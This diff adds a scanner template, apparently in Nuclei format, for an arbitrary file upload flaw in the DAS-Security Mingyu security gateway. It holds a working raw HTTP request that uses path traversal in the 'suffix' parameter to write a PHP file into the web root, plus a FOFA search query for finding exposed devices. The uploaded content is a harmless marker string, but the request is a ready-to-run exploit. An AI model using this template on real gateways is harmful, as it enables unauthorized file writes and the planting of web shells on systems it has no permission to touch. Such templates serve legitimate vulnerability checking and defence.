@@ -1,0 +1,59 @@
+id: poc-gsxfv617ffm8qymv
+info:
+  name: 安恒明御安全网关 aaa_local_web_preview 任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gsxfv617ffm8qymv'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gsxfv617ffm8qymv
+    fofa: title=="明御安全网关"
+http:
+- raw:
+  - 'POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../dudesuite.php HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    --849978f98abe41119122148e4aa65b1a
+
+
+    Content-Disposition: form-data; name="123"; filename="dudesuite.php"
+
+
+    Content-Type: text/plain
+
+
+
+
+    dudesuite
+
+
+    --849978f98abe41119122148e4aa65b1a--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    /dudesuite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
